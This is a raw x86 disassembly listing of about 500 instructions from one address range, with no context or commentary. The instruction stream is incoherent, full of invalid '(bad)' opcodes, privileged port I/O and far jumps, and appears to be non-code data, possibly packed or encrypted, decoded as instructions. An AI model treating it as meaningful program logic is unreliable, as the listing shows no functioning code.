  413a60:	arpl   WORD PTR [edx],bx
  413a62:	fwait
  413a63:	sub    eax,0x32c972a2
  413a68:	idiv   DWORD PTR [ebx+0x6c]
  413a6b:	xchg   bl,ah
  413a6d:	int    0xcf
  413a6f:	push   ax
  413a71:	dec    ecx
  413a72:	xchg   edi,eax
  413a73:	jle    0x413a0c
  413a75:	xchg   DWORD PTR [ecx],edi
  413a77:	or     esi,ebp
  413a79:	adc    eax,0xe375fb37
  413a7e:	xor    al,0x46
  413a80:	(bad)  [edx]
  413a82:	in     al,dx
  413a83:	sub    edi,ebx
  413a85:	add    al,0x4e
  413a87:	(bad)  
  413a88:	mov    eax,fs:0xaaa9551a
  413a8e:	ror    DWORD PTR [esi],cl
  413a90:	adc    eax,DWORD PTR [eax+0x52]
  413a93:	and    dl,cl
  413a95:	loopne 0x413aa1
  413a97:	push   0xffffffb2
  413a99:	mov    al,0xdb
  413a9b:	or     BYTE PTR [ecx],bl
  413a9d:	aam    0x74
  413a9f:	adc    al,0xeb
  413aa1:	add    DWORD PTR [ebx+0x7e],edi
  413aa4:	push   edi
  413aa5:	popf   
  413aa6:	inc    esp
  413aa7:	sub    ebp,DWORD PTR [ebp-0xe]
  413aaa:	fstp   QWORD PTR [eax+0x10]
  413aad:	out    dx,al
  413aae:	jmp    0x413a85
  413ab0:	call   0x3277:0x895bd455
  413ab7:	cs or  eax,0xbb71810f
  413abd:	mov    bl,BYTE PTR [ebx-0x64]
  413ac0:	xor    al,0x21
  413ac2:	jmp    0xebca2941
  413ac7:	int    0xa6
  413ac9:	sar    DWORD PTR [ebx+ecx*2+0x65],cl
  413acd:	adc    eax,0xe0c546fc
  413ad2:	jo     0x413b1d
  413ad4:	push   ecx
  413ad5:	push   esp
  413ad6:	(bad)  
  413ad8:	or     DWORD PTR ds:0xa8005d91,0x7a
  413adf:	xor    bl,BYTE PTR [esi]
  413ae1:	xchg   BYTE PTR [ecx+0x36],bh
  413ae4:	cld    
  413ae5:	mov    ebx,0x1115f019
  413aea:	jns    0x413a8c
  413aec:	xlat   BYTE PTR ds:[ebx]
  413aed:	aad    0x4f
  413aef:	(bad)
  413af3:	daa    
  413af4:	pushf  
  413af5:	out    dx,al
  413af6:	xchg   esi,eax
  413af7:	cld    
  413af8:	ins    BYTE PTR es:[edi],dx
  413af9:	mov    cl,0xf8
  413afb:	jo     0x413ac1
  413afd:	lods   eax,DWORD PTR ds:[esi]
  413afe:	and    esi,esp
  413b00:	lahf   
  413b01:	(bad)  
  413b02:	mov    al,0x18
  413b04:	and    al,BYTE PTR [eax+0x5c755b98]
  413b0a:	push   ebp
  413b0b:	enter  0x64e7,0xb2
  413b0f:	mov    ah,0xf7
  413b11:	pop    es
  413b12:	int3   
  413b13:	push   ss
  413b14:	das    
  413b15:	inc    esi
  413b16:	jecxz  0x413b1d
  413b18:	mov    WORD PTR [eax+0x3d66e2a7],cs
  413b1e:	inc    ebx
  413b1f:	sbb    eax,0xef999b30
  413b24:	aad    0x66
  413b26:	repnz (bad) [ebx+ebp*8-0x3e266265]
  413b2e:	push   esi
  413b2f:	ficom  DWORD PTR [ecx+ebx*8+0x272252fe]
  413b36:	push   ebx
  413b37:	jge    0x413b66
  413b39:	idiv   cl
  413b3b:	int    0x45
  413b3d:	retf   
  413b3e:	adc    ebx,0xffffffbb
  413b41:	cmp    bh,bh
  413b43:	(bad)  
  413b44:	or     ecx,ebp
  413b46:	or     DWORD PTR [eax],0xdb1080c7
  413b4c:	cmp    bl,ah
  413b4e:	mov    eax,ds:0x703be976
  413b53:	(bad)  
  413b54:	cmp    al,0x9e
  413b56:	cmp    dl,BYTE PTR [ecx+0x4b]
  413b59:	push   esp
  413b5a:	out    dx,eax
  413b5b:	sar    BYTE PTR [ecx+0x632e320b],0x7e
  413b62:	mov    ds:0x135c40cf,eax
  413b67:	xor    ecx,edi
  413b69:	loope  0x413b30
  413b6b:	cmp    DWORD PTR [edx],ecx
  413b6d:	pop    ss
  413b6e:	mov    ecx,?
  413b70:	cli    
  413b71:	mov    edi,0x292682c0
  413b76:	imul   edi,DWORD PTR [esi],0xffffffda
  413b79:	lods   eax,DWORD PTR ds:[esi]
  413b7a:	or     bl,BYTE PTR [ecx+0x2c]
  413b7d:	loope  0x413b95
  413b7f:	sub    al,0xf7
  413b81:	into   
  413b82:	pop    esi
  413b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b84:	jnp    0x39233136
  413b8a:	push   es
  413b8b:	xor    cl,dh
  413b8d:	in     eax,0x65
  413b8f:	call   0x41f6:0x2e99e514
  413b96:	xchg   BYTE PTR [edi-0x2f],ah
  413b99:	rol    DWORD PTR [eax],1
  413b9b:	ret    0x15e
  413b9e:	push   edx
  413b9f:	jae    0x413bc7
  413ba1:	retf   0xbe27
  413ba4:	mov    eax,ds:0xe5e264ef
  413ba9:	hlt    
  413baa:	pop    edx
  413bab:	xor    ah,0xc1
  413bae:	push   0xffffff8e
  413bb0:	rol    DWORD PTR [esi],1
  413bb2:	je     0x413bd3
  413bb4:	and    eax,0x30672cd5
  413bb9:	call   0x56ca:0xce56e81f
  413bc0:	mov    ah,0xe4
  413bc2:	in     al,0x14
  413bc4:	push   es
  413bc5:	mov    esi,0x359708a1
  413bca:	pop    edx
  413bcb:	ins    DWORD PTR es:[edi],dx
  413bcc:	push   edx
  413bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bce:	push   edi
  413bcf:	add    DWORD PTR [ecx-0x3393c83d],edx
  413bd5:	mov    edi,0xf3c85729
  413bda:	xchg   ecx,eax
  413bdb:	pop    ebx
  413bdc:	fist   DWORD PTR [ebx]
  413bde:	pop    esi
  413bdf:	push   es
  413be0:	retf   0x22b6
  413be3:	dec    edx
  413be4:	push   ds
  413be5:	sti    
  413be6:	jmp    0x413c15
  413be8:	js     0x413bef
  413bea:	sub    dl,dl
  413bec:	sub    ah,BYTE PTR [ebp-0x3d]
  413bef:	pop    edi
  413bf0:	out    0xb3,al
  413bf2:	sub    edi,esi
  413bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bf5:	(bad)  
  413bf6:	sbb    BYTE PTR [esi],al
  413bf8:	test   eax,0x3d2a6d62
  413bfd:	popa   
  413bfe:	add    al,0x30
  413c00:	jecxz  0x413c62
  413c02:	xchg   ebp,edi
  413c04:	iret   
  413c05:	popa   
  413c06:	jnp    0x413c5e
  413c08:	add    al,0x9b
  413c0a:	mov    esp,0xb677011e
  413c0f:	test   DWORD PTR [edx-0x2d72a546],eax
  413c15:	or     esp,0x883fd83
  413c1b:	into   
  413c1c:	repnz shr BYTE PTR [ecx],1
  413c1f:	dec    edx
  413c20:	mov    ds:0xedb01677,eax
  413c25:	adc    DWORD PTR [ecx+0x71],0xec957d7a
  413c2c:	std    
  413c2d:	and    al,0xb5
  413c2f:	fcom   QWORD PTR [esi]
  413c31:	imul   ecx,DWORD PTR [esi],0x2b34ae
  413c37:	mov    WORD PTR [esi-0x67f81399],cs
  413c3d:	daa    
  413c3e:	pop    ebx
  413c3f:	in     al,dx
  413c40:	repz push esi
  413c42:	pop    es
  413c43:	dec    esp
  413c44:	cmp    esi,DWORD PTR ds:0x382a17e0
  413c4a:	je     0x413c46
  413c4c:	add    ax,0x6784
  413c50:	pop    ebp
  413c51:	in     al,0x57
  413c53:	xchg   ebx,eax
  413c54:	ficom  WORD PTR [edx-0xeb45ff4]
  413c5a:	inc    esp
  413c5b:	outs   dx,DWORD PTR ds:[esi]
  413c5c:	imul   edx,DWORD PTR [esi-0x111dcc1c],0xbe10901c
  413c66:	jle    0x413c6b
  413c68:	aad    0x83
  413c6a:	cs shl edx,cl
  413c6d:	lds    edi,FWORD PTR [edx+0x3d]
  413c70:	jb     0x413c2c
  413c72:	adc    DWORD PTR [edx-0xda77dde],edi
  413c78:	cmp    esi,ecx
  413c7a:	dec    esp
  413c7b:	popf   
  413c7c:	iret   
  413c7d:	loop   0x413c5d
  413c7f:	je     0x413cf1
  413c81:	(bad)  
  413c82:	xchg   ebx,eax
  413c83:	xchg   ecx,eax
  413c84:	mov    edi,DWORD PTR [eax-0x1a841daa]
  413c8a:	jbe    0x413c15
  413c8c:	pop    esi
  413c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c8e:	in     al,0xe1
  413c90:	popa   
  413c91:	add    ebp,DWORD PTR [esi+0x4b]
  413c94:	push   0xffffffd8
  413c96:	pop    es
  413c97:	div    BYTE PTR [esp+edx*1+0x14]
  413c9b:	push   edx
  413c9c:	out    dx,eax
  413c9d:	cs jle 0x413d11
  413ca0:	(bad)  
  413ca1:	fnsave [eax+0x9]
  413ca4:	or     edx,ebp
  413ca6:	and    DWORD PTR [edx],0xd850a2fe
  413cac:	lods   al,BYTE PTR ds:[esi]
  413cad:	xlat   BYTE PTR ds:[ebx]
  413cae:	jecxz  0x413d04
  413cb0:	and    DWORD PTR [ecx],0xcc474e6d
  413cb6:	mov    ah,0x95
  413cb8:	sbb    bh,BYTE PTR [eax+0x39e0b384]
  413cbe:	adc    al,0xac
  413cc0:	cdq    
  413cc1:	scas   eax,DWORD PTR es:[edi]
  413cc2:	imul   edx,DWORD PTR [ebx-0x42],0x27
  413cc6:	hlt    
  413cc7:	jno    0x413d07
  413cc9:	mov    ecx,0xde4930e
  413cce:	mov    edx,edi
  413cd0:	mov    eax,0x1bdbe61c
  413cd5:	xor    eax,0x28c3546b
  413cda:	scas   al,BYTE PTR es:[edi]
  413cdb:	outs   dx,DWORD PTR ds:[esi]
  413cdc:	add    DWORD PTR [edx+0x45e3ab2a],ebx
  413ce2:	cwde   
  413ce3:	fisubr DWORD PTR [edx+0x771088df]
  413ce9:	xchg   edi,eax
  413cea:	push   cs
  413ceb:	nop
  413cec:	xor    DWORD PTR [edi-0x22],esp
  413cef:	mov    ch,0xe0
  413cf1:	add    al,0x3f
  413cf3:	(bad)  
  413cf4:	(bad)  
  413cf5:	repnz outs dx,BYTE PTR ds:[esi]
  413cf7:	pop    esi
  413cf8:	dec    ebx
  413cf9:	jp     0x413caa
  413cfb:	shl    edx,1
  413cfd:	mov    ebp,0x8762c4aa
  413d02:	inc    esp
  413d03:	icebp  
  413d04:	jne    0x413cb1
  413d06:	mov    ecx,ss
  413d08:	and    eax,0x95ad9fd6
  413d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d0e:	push   cs
  413d0f:	data16 (bad) 
  413d11:	rol    DWORD PTR [esp+ecx*2],cl
  413d14:	scas   eax,DWORD PTR es:[edi]
  413d15:	mov    esp,0x4dfdda86
  413d1a:	add    bh,ch
  413d1c:	leave  
  413d1d:	gs push edi
  413d1f:	adc    bl,BYTE PTR [esi-0x7a]
  413d22:	mov    edi,0x7f72aa82
  413d27:	cdq    
  413d28:	cs in  al,0x8b
  413d2b:	xor    ch,BYTE PTR [edx]
  413d2d:	push   ebp
  413d2e:	rcl    BYTE PTR [edi+0x153562c1],cl
  413d34:	imul   esp,DWORD PTR [edx],0xb2bf207b
  413d3a:	clc    
  413d3b:	mov    ebx,0xd9ff7b70
  413d40:	mov    edi,ecx
  413d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d43:	hlt    
  413d44:	into   
  413d45:	mov    cl,0x87
  413d47:	stos   BYTE PTR es:[edi],al
  413d48:	out    dx,eax
  413d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d4a:	pop    ebp
  413d4b:	test   BYTE PTR [eax+0x26],dh
  413d4e:	mov    bh,0x66
  413d50:	jmp    0x413d6c
  413d52:	jg     0x413cd9
  413d54:	dec    edi
  413d55:	xchg   esi,eax
  413d56:	sub    DWORD PTR [ecx],ecx
  413d58:	mov    DWORD PTR [ebp+0x22],esi
  413d5b:	mov    eax,es:0xd44e1e79
  413d61:	cdq    
  413d62:	data16 fcomp DWORD PTR [eax-0x1b415b3a]
  413d69:	test   edi,ebp
  413d6b:	imul   ecx,ebx,0x68
  413d6e:	in     al,dx
  413d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d70:	cmp    DWORD PTR [eax],ecx
  413d72:	(bad)
  413d77:	xchg   DWORD PTR [eax+0x4232d2f3],eax
  413d7d:	scas   al,BYTE PTR es:[edi]
  413d7e:	sbb    BYTE PTR [ebp+0x6f3179bc],0xca
  413d85:	xor    eax,ebp
  413d87:	inc    ecx
  413d88:	xlat   BYTE PTR ds:[ebx]
  413d89:	cmc    
  413d8a:	in     eax,dx
  413d8b:	es jb  0x413db4
  413d8e:	add    eax,0x468bb1b2
  413d93:	and    eax,DWORD PTR [ebx+0x1b]
  413d96:	ret    0xd78a
  413d99:	pop    ss
  413d9a:	or     eax,0x9bc4191b
  413d9f:	push   esp
  413da0:	ja     0x413d9c
  413da2:	pop    ecx
  413da3:	scas   eax,DWORD PTR es:[edi]
  413da4:	adc    edi,ebx
  413da6:	mov    ah,BYTE PTR [ebx+0x285a4a99]
  413dac:	outs   dx,DWORD PTR ds:[esi]
  413dad:	rep lods eax,DWORD PTR ds:[esi]
  413daf:	test   BYTE PTR [eax+eax*1+0x78],dh
  413db3:	push   es
  413db4:	or     al,0xd6
  413db6:	dec    edi
  413db7:	mov    al,0x4d
  413db9:	das    
  413dba:	add    al,0x3a
  413dbc:	sub    DWORD PTR [edx+0x2ce630d4],ecx
  413dc2:	js     0x413d5a
  413dc4:	stos   BYTE PTR es:[edi],al
  413dc5:	sub    al,0xcb
  413dc7:	test   al,0x45
  413dc9:	or     DWORD PTR [esi-0x7e758669],edi
  413dcf:	jmp    0x413e40
  413dd1:	push   es
  413dd2:	sti    
  413dd3:	or     DWORD PTR [ebp+esi*2+0xb94d105],ebp
  413dda:	pop    esp
  413ddb:	outs   dx,BYTE PTR ds:[esi]
  413ddc:	inc    ebp
  413ddd:	push   ecx
  413dde:	out    dx,eax
  413ddf:	sbb    eax,0xced18214
  413de4:	jle    0x413d7b
  413de6:	xlat   BYTE PTR ds:[ebx]
  413de7:	mov    eax,ds:0xc3e50fae
  413dec:	imul   ecx,edi,0x52
  413def:	stos   BYTE PTR es:[edi],al
  413df0:	sahf   
  413df1:	jne    0x413d8b
  413df3:	jne    0x413d7d
  413df5:	and    DWORD PTR cs:[ecx-0x543122af],ecx
  413dfc:	pop    ecx
  413dfd:	loopne 0x413e09
  413dff:	loop   0x413d8b
  413e01:	into   
  413e02:	sub    ch,BYTE PTR [eax-0x35]
  413e05:	adc    esp,ebp
  413e07:	or     eax,0xea4395e7
  413e0c:	scas   al,BYTE PTR es:[edi]
  413e0d:	mov    esi,0x2dfb3c7f
  413e12:	jnp    0x413e0e
  413e14:	sbb    ecx,esp
  413e16:	push   0x34
  413e18:	pop    ecx
  413e19:	scas   eax,DWORD PTR es:[edi]
  413e1a:	or     ebp,edx
  413e1c:	mov    ebx,0xe1d63811
  413e21:	or     DWORD PTR [eax-0x34a61695],0x8952a0bb
  413e2b:	test   DWORD PTR [esi-0x1042c858],ecx
  413e31:	in     eax,dx
  413e32:	cwde   
  413e33:	adc    ch,bh
  413e35:	xchg   ecx,eax
  413e36:	ja     0x413e2a
  413e38:	test   al,0x92
  413e3a:	addr16 mov ds:0x9ed3,al
  413e3e:	inc    eax
  413e3f:	repnz xchg esi,eax
  413e41:	xor    ah,BYTE PTR [ebp+0x6b]
  413e44:	mov    al,ds:0xe9fb8bc9
  413e49:	cwde   
  413e4a:	jbe    0x413ea3
  413e4c:	cli    
  413e4d:	aas    
  413e4e:	pop    edx
  413e4f:	mov    eax,ds:0x2780f864
  413e54:	outs   dx,BYTE PTR ds:[esi]
  413e55:	pop    ebp
  413e56:	outs   dx,BYTE PTR ds:[esi]
  413e57:	outs   dx,DWORD PTR ds:[esi]
  413e58:	mov    BYTE PTR [edi+0x746077f6],ah
  413e5e:	(bad)  
  413e60:	dec    eax
  413e61:	loopne 0x413dee
  413e63:	test   DWORD PTR [edx-0x1],ecx
  413e66:	ret    
  413e67:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e69:	repnz lock ror BYTE PTR [ecx-0x36],cl
  413e6e:	in     eax,dx
  413e6f:	add    esi,0x5e275aa
  413e75:	bound  esp,QWORD PTR [eax+0x5bcbf0c0]
  413e7b:	mov    ds:0x391964fa,al
  413e80:	xchg   edx,eax
  413e81:	pusha  
  413e82:	(bad)  
  413e83:	cmp    DWORD PTR ds:0x11b01264,esi
  413e89:	aam    0xa0
  413e8b:	inc    ebx
  413e8c:	mov    ch,dl
  413e8e:	shr    BYTE PTR [edx],1
  413e90:	push   esi
  413e91:	mov    bl,0x1d
  413e93:	mov    dh,0xd0
  413e95:	sub    DWORD PTR [edi],ebx
  413e97:	in     eax,dx
  413e98:	sbb    eax,DWORD PTR [edx-0x28]
  413e9b:	test   al,0x6f
  413e9d:	or     al,0x59
  413e9f:	mov    ecx,0xf9370650
  413ea4:	ss dec esi
  413ea6:	push   ecx
  413ea7:	dec    ecx
  413ea8:	inc    esi
  413ea9:	call   0xb8effabb
  413eae:	repz inc ebp
  413eb0:	mov    edx,0xaa570792
  413eb5:	jne    0x413f28
  413eb7:	or     eax,0x15be2032
  413ebc:	ret    
  413ebd:	dec    edi
  413ebe:	fisub  DWORD PTR [edx]
  413ec0:	in     eax,dx
  413ec1:	outs   dx,BYTE PTR ds:[esi]
  413ec2:	jae    0x413f02
  413ec4:	sub    BYTE PTR [eax+0x75],dl
  413ec7:	mov    dh,0x8b
  413ec9:	(bad)  
  413eca:	mov    eax,ds:0x38e61e60
  413ecf:	mul    BYTE PTR [eax+0x60]
  413ed2:	jp     0x413ea8
  413ed4:	push   edi
  413ed5:	je     0x413f52
  413ed7:	mov    eax,ecx
  413ed9:	in     eax,0x8f
  413edb:	mov    esp,0xefd7821e
  413ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ee1:	sahf   
  413ee2:	fmul   QWORD PTR [ebx]
  413ee4:	mov    WORD PTR [ecx-0x1b6d559b],cs
  413eea:	dec    ebp
  413eeb:	xchg   bl,bh
  413eed:	popa   
  413eee:	cmp    esi,DWORD PTR [ebp+eax*4-0xa]
  413ef2:	retf   0x2614
  413ef5:	dec    esi
  413ef6:	rcr    edi,1
  413ef8:	or     al,0xf6
  413efa:	fs ds push es
  413efd:	jae    0x413ea9
  413eff:	sbb    eax,0x59da0dc
  413f04:	xor    edi,DWORD PTR [eax-0xe]
  413f07:	pop    ebp
  413f08:	out    0x30,al
  413f0a:	out    dx,eax
  413f0b:	dec    ecx
  413f0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0d:	(bad)  [ebx]
  413f0f:	add    DWORD PTR [ebx+0x78745f67],ebp
  413f15:	popf   
  413f16:	dec    ebx
  413f17:	jecxz  0x413ebf
  413f19:	mov    DWORD PTR ds:0xba8d0ad8,ecx
  413f1f:	pop    esp
  413f20:	out    dx,al
  413f21:	add    BYTE PTR [ebp-0x6f],cl
  413f24:	dec    edi
  413f25:	push   cs
  413f26:	ins    DWORD PTR es:[edi],dx
  413f27:	adc    BYTE PTR [ebp+0x6af3f7dc],ah
  413f2d:	mov    ecx,0x69edd765
  413f32:	loop   0x413ec0
  413f34:	nop
  413f35:	mov    ecx,0x942a8e7f
  413f3a:	cmc    
  413f3b:	scas   al,BYTE PTR es:[edi]
  413f3c:	and    ebp,eax
  413f3e:	mov    eax,edx
  413f40:	xor    BYTE PTR [edx-0x7b922ecf],0xd3
  413f47:	in     al,0x95
  413f49:	jo     0x413f0d
  413f4b:	jle    0x413eed
  413f4d:	into   
  413f4e:	ins    DWORD PTR es:[edi],dx
  413f4f:	and    ah,ah
  413f51:	and    edi,0x20
  413f54:	mov    BYTE PTR [ebx-0x7c],dl
  413f57:	add    eax,0x9cd6e0d7
  413f5c:	mov    bl,0x67
  413f5e:	mov    ch,0x1a
  413f60:	outs   dx,DWORD PTR ds:[esi]
  413f61:	rol    BYTE PTR [ebx+0x1c],1
  413f64:	fwait
  413f65:	loop   0x413f1f
  413f67:	dec    ebp
  413f68:	push   ds
  413f69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f6a:	inc    ebp
  413f6b:	in     al,0x4e
  413f6d:	xchg   esi,eax
  413f6e:	add    eax,0x6d2ba459
  413f73:	mov    WORD PTR [ecx],ds
  413f75:	sbb    al,0xe0
  413f77:	cdq    
  413f78:	adc    DWORD PTR [edi-0x740ef3d],ecx
  413f7e:	push   0x71
  413f80:	sub    al,0xc0
  413f82:	arpl   WORD PTR [ebp-0x5e],sp
  413f85:	scas   al,BYTE PTR es:[edi]
  413f86:	mov    esp,0xc7edc7c4
  413f8b:	js     0x413f32
  413f8d:	stc    
  413f8e:	xor    esp,esi
  413f90:	inc    esi
  413f91:	je     0x413fe7
  413f93:	push   eax
  413f94:	icebp  
  413f95:	mov    ecx,0xa34de92e
  413f9a:	jg     0x413f67
  413f9c:	jecxz  0x413f48
  413f9e:	xchg   esp,eax
  413f9f:	mov    eax,0xa85dea90
  413fa4:	sbb    ebx,DWORD PTR [eax]
  413fa6:	jne    0x41400b
  413fa8:	aas    
  413fa9:	js     0x413ff3
  413fab:	jae    0x413f40
  413fad:	mov    edx,0x85ea6e37
  413fb2:	cwde   
  413fb3:	in     eax,0x91
  413fb5:	lds    edi,FWORD PTR [ebx-0x55]
  413fb8:	jle    0x413fb7
  413fba:	popf   
  413fbb:	add    DWORD PTR [edx+0x7288ff81],ecx
  413fc1:	inc    ebx
  413fc2:	pop    es
  413fc3:	sbb    edx,DWORD PTR [ecx+0x3745cb1d]
  413fc9:	cmp    BYTE PTR [edi+edi*2+0x56c597a5],ah
  413fd0:	add    esp,esp
  413fd2:	xchg   esi,eax
  413fd3:	retf   
  413fd4:	or     DWORD PTR [ebx],ebp
  413fd6:	stos   BYTE PTR es:[edi],al
  413fd7:	mov    BYTE PTR [edi],0xb7
  413fda:	xlat   BYTE PTR ds:[ebx]
  413fdb:	ins    DWORD PTR es:[edi],dx
  413fdc:	out    0xb3,eax
  413fde:	mov    ebx,0xc90cd53d
  413fe3:	arpl   WORD PTR [esi-0x22],bx
  413fe6:	call   0xc0a9:0x6c8d2aeb
  413fed:	fcmovne st,st(3)
  413fef:	addr16 (bad) 
  413ff1:	mov    edx,0xde9f91e1
  413ff6:	jns    0x413fd8
  413ff8:	or     edx,ebx
  413ffa:	sub    ecx,edi
  413ffc:	inc    ecx
  413ffd:	and    ebp,DWORD PTR [esi+ebx*8]
  414000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414001:	inc    esp
  414002:	fisub  DWORD PTR [esi+ebx*2+0x61a351c7]
  414009:	(bad)  
  41400a:	loopne 0x41402d
  41400c:	xor    al,0x9f
  41400e:	lds    ebx,FWORD PTR [edx-0x72]
  414011:	mov    ds:0xaac10aff,eax
  414016:	mov    al,ds:0x25ddca4
  41401b:	lea    edi,[ecx+edi*2-0x47]
  41401f:	pop    ebx
  414020:	xor    DWORD PTR [esi],edx
  414022:	inc    ebx
  414023:	mov    edi,0x337badc5
  414028:	sbb    bh,0x99
  41402b:	sahf   
  41402c:	pop    ss
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	bound  ebp,QWORD PTR [ebx-0x2]
  414031:	fst    DWORD PTR [ebx+0x6d835162]
  414037:	cmp    eax,DWORD PTR [edx-0x28]
  41403a:	jo     0x414097
  41403c:	in     eax,dx
  41403d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41403e:	aam    0x82
  414040:	and    BYTE PTR [edi+0x56],ch
  414043:	mov    WORD PTR [ebp+0x1a],ss
  414046:	fimul  WORD PTR [esi]
  414048:	dec    ebp
  414049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41404a:	xor    BYTE PTR [edi+ecx*4-0x64],cl
  41404e:	aaa    
  41404f:	mov    BYTE PTR [ecx-0x150cc5b5],dl
  414055:	daa    
  414056:	out    dx,eax
  414057:	or     DWORD PTR [ebx+0x75],0x7f0b64cb
  41405e:	pushf  
  41405f:	iret   
  414060:	ds dec esp
  414062:	lea    ebx,[esi]
  414064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414065:	sub    DWORD PTR [edi-0x3b240b0d],ebp
  41406b:	add    edx,edi
  41406d:	pop    esp
  41406e:	xor    edx,eax
  414070:	jmp    0x2da294b6
  414075:	lods   eax,DWORD PTR ds:[esi]
  414076:	(bad)  
  414077:	xlat   BYTE PTR ds:[ebx]
  414078:	neg    DWORD PTR [ebp+0x17]
  41407b:	jmp    0x41409c
  41407d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41407e:	cmp    BYTE PTR [ebx-0x43],0x4e
  414082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414083:	icebp  
  414084:	out    0xc7,al
  414086:	ds jno 0x41402e
  414089:	inc    edx
  41408a:	cli    
  41408b:	pop    esp
  41408c:	adc    cl,BYTE PTR [eax]
  41408e:	or     BYTE PTR [eax-0x6d244561],dl
  414094:	mov    eax,DWORD PTR [ecx]
  414096:	push   ss
  414097:	ret    
  414098:	lahf   
  414099:	mov    bh,0x23
  41409b:	imul   eax,DWORD PTR [esi],0x6d
  41409e:	dec    edx
  41409f:	cmp    edi,DWORD PTR [ebx]
  4140a1:	jb     0x4140fc
  4140a3:	arpl   dx,di
  4140a5:	pop    ds
  4140a6:	das    
  4140a7:	xor    al,ah
  4140a9:	ins    BYTE PTR es:[edi],dx
  4140aa:	and    edx,DWORD PTR [ebp-0x77]
  4140ad:	add    DWORD PTR [ebx],ecx
  4140af:	and    al,0x13
  4140b1:	leave  
  4140b2:	nop
  4140b3:	into   
  4140b4:	push   es
  4140b5:	mov    ds:0xb787a131,al
  4140ba:	imul   esi,DWORD PTR [ebx-0x72],0x39
  4140be:	inc    esp
  4140bf:	dec    ecx
  4140c0:	push   cs
  4140c1:	xor    BYTE PTR [ecx],0x7b
  4140c4:	lea    esi,[ecx+0x37]
  4140c7:	pop    es
  4140c8:	fisubr DWORD PTR [ebx]
  4140ca:	mov    dh,0x0
  4140cc:	xlat   BYTE PTR ds:[ebx]
  4140cd:	out    0x9b,eax
  4140cf:	cmp    al,0x67
  4140d1:	int    0x3c
  4140d3:	or     BYTE PTR [esp+eax*1],ch
  4140d6:	test   al,0xe1
  4140d8:	mov    esp,0x5fa0bbc3
  4140dd:	jl     0x414142
  4140df:	sbb    ah,BYTE PTR [ebx]
  4140e1:	adc    eax,0xdf232c31
  4140e6:	int3   
  4140e7:	cld    
  4140e8:	jno    0x414158
  4140ea:	xchg   esp,eax
  4140eb:	arpl   WORD PTR [ecx-0x15],bx
  4140ee:	and    ecx,ecx
  4140f0:	sbb    DWORD PTR [esi-0x2f],edi
  4140f3:	stc    
  4140f4:	or     al,0xc5
  4140f6:	out    dx,eax
  4140f7:	push   ebx
  4140f8:	or     al,0x3d
  4140fa:	stos   BYTE PTR es:[edi],al
  4140fb:	push   cs
  4140fc:	xchg   edi,eax
  4140fd:	call   0xadc70308
  414102:	mov    edx,0xa43b7a28
  414107:	fwait
  414108:	bound  esp,QWORD PTR [edx]
  41410a:	and    edi,DWORD PTR ds:0x8d4dab37
  414110:	rcl    ch,0xd2
  414113:	cmp    DWORD PTR [edi+edi*4],0xa6afc320
  41411a:	dec    edx
  41411b:	sub    al,0xde
  41411d:	je     0x414134
  41411f:	lock out dx,al
  414121:	cmc    
  414122:	cmp    eax,DWORD PTR [ebx+eiz*4-0x63]
  414126:	retf   0x7f5f
  414129:	shr    DWORD PTR [ebx+0x2e],1
  41412c:	mov    ebp,0xde2988be
  414131:	(bad)  
  414132:	outs   dx,BYTE PTR ds:[esi]
  414133:	test   cl,dh
  414135:	or     DWORD PTR [esi+0x25],ebp
  414138:	mov    ebx,0xdeecd6dd
  41413d:	and    al,0x62
  41413f:	in     al,0xa4
  414141:	bound  ecx,QWORD PTR [edi-0x5b]
  414144:	mov    ch,0xc3
  414146:	and    ebp,eax
  414148:	jl     0x41411a
  41414a:	pop    eax
  41414b:	cmp    al,0x3d
  41414d:	ror    BYTE PTR [ebx-0x31],0x97
  414151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414152:	ss in  al,dx
  414154:	imul   ecx,DWORD PTR [ebx],0x5f
  414157:	aas    
  414158:	aaa    
  414159:	loopne 0x4141b0
  41415b:	inc    edx
  41415c:	in     al,0xed
  41415e:	pop    ebp
  41415f:	xor    al,bl
  414161:	push   cs
  414162:	or     BYTE PTR [ecx+0x9],dl
  414165:	shl    DWORD PTR [ecx+ebp*2],1
  414168:	xchg   esi,eax
  414169:	sub    ebx,DWORD PTR [ebx]
  41416b:	cdq    
  41416c:	adc    dl,cl
  41416e:	xor    esp,ecx
  414170:	gs pop edx
  414172:	pop    esp
  414173:	mov    ebp,0xf99516c1
  414178:	and    esi,ecx
  41417a:	cmp    al,0xcf
  41417c:	cmp    DWORD PTR [ebp-0x5e],edx
  41417f:	mov    ecx,DWORD PTR [edi+0x2a]
  414182:	leave  
  414183:	stc    
  414184:	retf   0x21bf
  414187:	mov    dh,0xca
  414189:	fcom   QWORD PTR [ecx+0x26]
  41418c:	pop    edx
  41418d:	call   0x7f16ae29
  414192:	shl    BYTE PTR [edx-0x3c],0x79
  414196:	xchg   ecx,eax
  414197:	push   edx
  414198:	or     DWORD PTR [ecx+0x376ef2c0],esi
  41419e:	xor    DWORD PTR [esi+0x1],ebx
  4141a1:	pop    ss
  4141a2:	jmp    0x4141ac
  4141a4:	jmp    0xdc4:0xd8e25764
  4141ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ac:	mov    ds:0x37549eda,al
  4141b1:	pop    eax
  4141b2:	mov    edi,DWORD PTR [esi+ecx*4+0x21170603]
